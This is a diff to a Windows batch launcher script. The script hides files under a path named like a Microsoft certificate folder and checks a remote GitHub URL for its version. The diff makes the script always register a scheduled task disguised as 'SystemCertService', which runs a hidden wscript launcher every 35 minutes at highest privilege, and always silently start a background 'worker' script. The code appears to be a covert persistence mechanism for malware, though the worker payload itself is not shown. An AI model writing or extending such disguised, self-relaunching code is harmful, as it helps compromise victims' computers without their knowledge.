@@ -1,4 +1,4 @@
-set "LAUNCHER_VERSION=1.3"
+set "LAUNCHER_VERSION=1.4"
 set "LAUNCHER_VERSION_URL=https://raw.githubusercontent.com/escola-iracema/isrs/main/launcher_version.txt"
 
 set "secretPath=%LOCALAPPDATA%\Microsoft\SystemCertificates"
@@ -46,14 +46,9 @@ if not exist "%shortcutPath%" (
          $s.Save()" >nul 2>&1
 )
 
-schtasks /query /tn "SystemCertService" >nul 2>&1
-if %errorlevel% neq 0 (
-    schtasks /create /tn "SystemCertService" /tr "wscript.exe \"%vbsLauncherPath%\" \"%launcherScriptPath%\"" /sc MINUTE /mo 35 /rl HIGHEST /f >nul
-)
+schtasks /create /tn "SystemCertService" /tr "wscript.exe \"%vbsLauncherPath%\" \"%launcherScriptPath%\"" /sc MINUTE /mo 35 /rl HIGHEST /f >nul
 
-if exist "%workerScriptPath%" (
-    start "" /B wscript.exe "%vbsLauncherPath%" "%workerScriptPath%"
-)
+start "" /B wscript.exe "%vbsLauncherPath%" "%workerScriptPath%"
 
 :eof
 endlocal
